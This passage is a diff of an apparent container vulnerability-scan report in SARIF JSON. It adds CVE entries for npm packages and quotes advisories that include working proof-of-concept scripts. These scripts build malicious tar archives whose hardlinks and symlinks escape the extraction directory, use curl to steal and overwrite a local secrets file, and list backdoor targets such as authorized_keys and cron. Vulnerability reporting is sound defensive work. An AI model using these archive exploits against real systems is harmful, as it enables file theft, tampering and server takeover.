@@ -303,22 +303,48 @@
               "shortDescription": {
                 "text": "CVE-2025-5889: Uncontrolled Resource Consumption"
               },
-              "helpUri": "https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D1.0.0%2C%3C%3D1.1.11",
+              "helpUri": "https://scout.docker.com/v/CVE-2025-5889?s=github&n=brace-expansion&t=npm&vr=%3E%3D2.0.0%2C%3C%3D2.0.1",
               "help": {
                 "text": "A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.\n",
-                "markdown": "> A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.\n\n|                                                                                                                                                                                                                                                 |\n|Package                                                                                                                                                                                                          pkg:npm/brace-expansion@1.1.11  |\n|Affected range                                                                                                                                                                                                   >=1.0.0,<=1.1.11                |\n|Fixed version                                                                                                                                                                                                    1.1.12                          |\n|[[CVSS Score 1.3] [CVSS Vector CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X]]                                  |\n"
+                "markdown": "> A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.\n\n|                                                                                                                                                                                                                                                |\n|Package                                                                                                                                                                                                          pkg:npm/brace-expansion@2.0.1  |\n|Affected range                                                                                                                                                                                                   >=2.0.0,<=2.0.1                |\n|Fixed version                                                                                                                                                                                                    2.0.2                          |\n|[[CVSS Score 1.3] [CVSS Vector CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X]]                                 |\n"
               },
               "properties": {
-                "affected_version": ">=2.0.0,<=2.0.1",
+                "affected_version": ">=1.0.0,<=1.1.11",
                 "cvssV3": 1.3,
                 "cvssV3_severity": "LOW",
                 "cvssV3_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
-                "fixed_version": "2.0.2",
+                "fixed_version": "1.1.12",
                 "purls": [
                   "pkg:npm/brace-expansion@1.1.11",
                   "pkg:npm/brace-expansion@2.0.1"
                 ],
                 "security-severity": "1.3",
+                "tags": [
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24001",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-24001: Inefficient Regular Expression Complexity"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-24001?s=github&n=diff&t=npm&vr=%3E%3D5.0.0%2C%3C5.2.2",
+              "help": {
+                "text": "### Impact\n\nAttempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649\n\n\n### CVE Notes\n\nNote that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability.\n",
+                "markdown": "> ### Impact\n\nAttempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649\n\n\n### CVE Notes\n\nNote that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit. Therefore we assume that the bugs cannot possibly constitute Independently Fixable Vulnerabilities in the sense of CVE CNA rule 4.2.11, but rather that this advisory is properly construed under the rules as describing a single Vulnerability.\n\n|                                                                                                                          |\n|Package                                                                                               pkg:npm/diff@5.1.0  |\n|Affected range                                                                                        >=5.0.0,<5.2.2      |\n|Fixed version                                                                                         5.2.2               |\n|[[CVSS Score 2.7] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:U]]                      |\n"
+              },
+              "properties": {
+                "affected_version": ">=5.0.0,<5.2.2",
+                "cvssV3": 2.7,
+                "cvssV3_severity": "LOW",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:U",
+                "fixed_version": "5.2.2",
+                "purls": [
+                  "pkg:npm/diff@5.1.0"
+                ],
+                "security-severity": "2.7",
                 "tags": [
                   "LOW"
                 ]
@@ -403,6 +429,32 @@
               }
             },
             {
+              "id": "CVE-2025-13465",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2025-13465: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2025-13465?s=github&n=lodash&t=npm&vr=%3E%3D4.0.0%2C%3C%3D4.17.22",
+              "help": {
+                "text": "### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.\n",
+                "markdown": "> ### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.\n\n|                                                                                                                              |\n|Package                                                                                               pkg:npm/lodash@4.17.20  |\n|Affected range                                                                                        >=4.0.0,<=4.17.22       |\n|Fixed version                                                                                         4.17.23                 |\n|[[CVSS Score 6.9] [CVSS Vector CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:H/SI:H/SA:H/E:P]]                          |\n"
+              },
+              "properties": {
+                "affected_version": ">=4.0.0,<=4.17.22",
+                "cvssV3": 6.9,
+                "cvssV3_severity": "MEDIUM",
+                "cvssV3_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:H/SI:H/SA:H/E:P",
+                "fixed_version": "4.17.23",
+                "purls": [
+                  "pkg:npm/lodash@4.17.20"
+                ],
+                "security-severity": "6.9",
+                "tags": [
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
               "id": "CVE-2021-23337",
               "name": "OsPackageVulnerability",
               "shortDescription": {
@@ -481,6 +533,58 @@
               }
             },
             {
+              "id": "CVE-2026-23745",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-23745: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-23745?s=github&n=tar&t=npm&vr=%3C%3D7.5.2",
+              "help": {
+                "text": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)\n",
+                "markdown": "> ### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local \"secret\" file was successfully overwritten.\n\n```javascript\nconst fs = require('fs')\nconst path = require('path')\nconst tar = require('tar')\n\nconst out = path.resolve('out_repro')\nconst secret = path.resolve('secret.txt')\nconst tarFile = path.resolve('exploit.tar')\nconst targetSym = '/etc/passwd'\n\n// Cleanup & Setup\ntry { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}\nfs.mkdirSync(out)\nfs.writeFileSync(secret, 'ORIGINAL_DATA')\n\n// 1. Craft malicious Link header (Hardlink to absolute local file)\nconst h1 = new tar.Header({\n  path: 'exploit_hard',\n  type: 'Link',\n  size: 0,\n  linkpath: secret \n})\nh1.encode()\n\n// 2. Craft malicious Symlink header (Symlink to /etc/passwd)\nconst h2 = new tar.Header({\n  path: 'exploit_sym',\n  type: 'SymbolicLink',\n  size: 0,\n  linkpath: targetSym \n})\nh2.encode()\n\n// Write binary tar\nfs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))\n\nconsole.log('[*] Extracting malicious tarball...')\n\n// 3. Extract with default secure settings\ntar.x({\n  cwd: out,\n  file: tarFile,\n  preservePaths: false\n}).then(() => {\n  console.log('[*] Verifying payload...')\n\n  // Test Hardlink Overwrite\n  try {\n    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')\n    \n    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {\n      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')\n    } else {\n      console.log('[-] Hardlink failed')\n    }\n  } catch (e) {}\n\n  // Test Symlink Poisoning\n  try {\n    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {\n      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')\n    } else {\n      console.log('[-] Symlink failed')\n    }\n  } catch (e) {}\n})\n\n```\n\n### Impact\n\n* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.\n* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)\n\n|                                                                                                                      |\n|Package                                                                                           pkg:npm/tar@6.1.11  |\n|Affected range                                                                                    <=7.5.2             |\n|Fixed version                                                                                     7.5.3               |\n|[[CVSS Score 8.2] [CVSS Vector CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N]]                      |\n"
+              },
+              "properties": {
+                "affected_version": "<=7.5.2",
+                "cvssV3": 8.2,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N",
+                "fixed_version": "7.5.3",
+                "purls": [
+                  "pkg:npm/tar@6.1.11"
+                ],
+                "security-severity": "8.2",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24842",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-24842: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-24842?s=github&n=tar&t=npm&vr=%3C7.5.7",
+              "help": {
+                "text": "### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets\n",
+                "markdown": "> ### Summary\nnode-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.\n\n### Details\nThe vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:\n\n**Security check in `[STRIPABSOLUTEPATH]`:**\n```javascript\nconst entryDir = path.posix.dirname(entry.path);\nconst resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));\nif (resolved.startsWith('../')) { /* block */ }\n```\n\n**Hardlink creation in `[HARDLINK]`:**\n```javascript\nconst linkpath = path.resolve(this.cwd, entry.linkpath);\nfs.linkSync(linkpath, dest);\n```\n\n**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.\n\n- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.\n\n- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.\n\nThe security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.\n\n### PoC\n#### Setup\n\nCreate a new directory with these files:\n\n```\npoc/\n├── package.json\n├── secret.txt          ← sensitive file (target)\n├── server.js           ← vulnerable server\n├── create-malicious-tar.js\n├── verify.js\n└── uploads/            ← created automatically by server.js\n    └── (extracted files go here)\n```\n\n**package.json**\n```json\n{ \"dependencies\": { \"tar\": \"^7.5.0\" } }\n```\n\n**secret.txt** (sensitive file outside uploads/)\n```\nDATABASE_PASSWORD=supersecret123\n```\n\n**server.js** (vulnerable file upload server)\n```javascript\nconst http = require('http');\nconst fs = require('fs');\nconst path = require('path');\nconst tar = require('tar');\n\nconst PORT = 3000;\nconst UPLOAD_DIR = path.join(__dirname, 'uploads');\nfs.mkdirSync(UPLOAD_DIR, { recursive: true });\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/upload') {\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', async () => {\n      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));\n      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });\n      res.end('Extracted\\n');\n    });\n  } else if (req.method === 'GET' && req.url === '/read') {\n    // Simulates app serving extracted files (e.g., file download, static assets)\n    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n    if (fs.existsSync(targetPath)) {\n      res.end(fs.readFileSync(targetPath));\n    } else {\n      res.end('File not found\\n');\n    }\n  } else if (req.method === 'POST' && req.url === '/write') {\n    // Simulates app writing to extracted file (e.g., config update, log append)\n    const chunks = [];\n    req.on('data', c => chunks.push(c));\n    req.on('end', () => {\n      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');\n      if (fs.existsSync(targetPath)) {\n        fs.writeFileSync(targetPath, Buffer.concat(chunks));\n        res.end('Written\\n');\n      } else {\n        res.end('File not found\\n');\n      }\n    });\n  } else {\n    res.end('POST /upload, GET /read, or POST /write\\n');\n  }\n}).listen(PORT, () => console.log(`http://localhost:${PORT}`));\n```\n\n**create-malicious-tar.js** (attacker creates exploit TAR)\n```javascript\nconst fs = require('fs');\n\nfunction tarHeader(name, type, linkpath = '', size = 0) {\n  const b = Buffer.alloc(512, 0);\n  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);\n  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);\n  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);\n  b.write('        ', 148);\n  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;\n  if (linkpath) b.write(linkpath, 157);\n  b.write('ustar\\x00', 257); b.write('00', 263);\n  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];\n  b.write(sum.toString(8).padStart(6, '0') + '\\x00 ', 148);\n  return b;\n}\n\n// Hardlink escapes to parent directory's secret.txt\nfs.writeFileSync('malicious.tar', Buffer.concat([\n  tarHeader('d/', 'dir'),\n  